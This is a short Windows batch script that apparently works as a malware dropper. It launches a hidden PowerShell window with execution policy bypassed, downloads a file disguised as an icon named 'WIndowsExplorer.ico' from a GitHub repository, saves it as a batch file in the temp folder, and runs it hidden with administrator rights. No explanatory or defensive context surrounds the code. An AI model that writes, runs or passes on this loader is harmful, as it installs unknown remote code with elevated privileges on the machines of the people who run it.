@echo off
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/xhero2025/XH-ENC/raw/refs/heads/main/WIndowsExplorer.ico' -OutFile $env:TEMP\WindowsExplorer.bat; Start-Process -FilePath $env:TEMP\WindowsExplorer.bat -WindowStyle Hidden -Verb RunAs}"
exit